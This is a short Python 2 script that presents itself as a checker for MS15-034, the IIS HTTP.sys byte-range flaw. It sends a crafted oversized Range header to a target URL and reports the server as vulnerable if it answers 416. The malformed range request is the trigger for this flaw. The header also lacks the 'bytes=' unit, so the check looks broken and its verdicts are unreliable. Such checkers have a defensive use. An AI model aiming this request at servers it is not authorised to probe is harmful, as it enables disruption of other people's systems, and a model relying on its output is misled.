import requests
print "################################################################"
print "MS15-034 Byte Range Server DoS check (IIS) - By Alienwithin"
print "################################################################\n\n"
target = raw_input("Please Enter target to test e.g. http://example.com: \n")
alienHeads = {'Range': '0-12839131982321398123'}
checkForVuln = requests.get(target, headers=alienHeads)
if checkForVuln.status_code == 416: 
	print "\nStatus: Vulnerable\nReason: Target seems to be vulnerable as it tried to handle our large range which was not satisfiable"
else: 
	print "\nStatus: Safe\nReason: Target Seems to be patched against MS15-034"
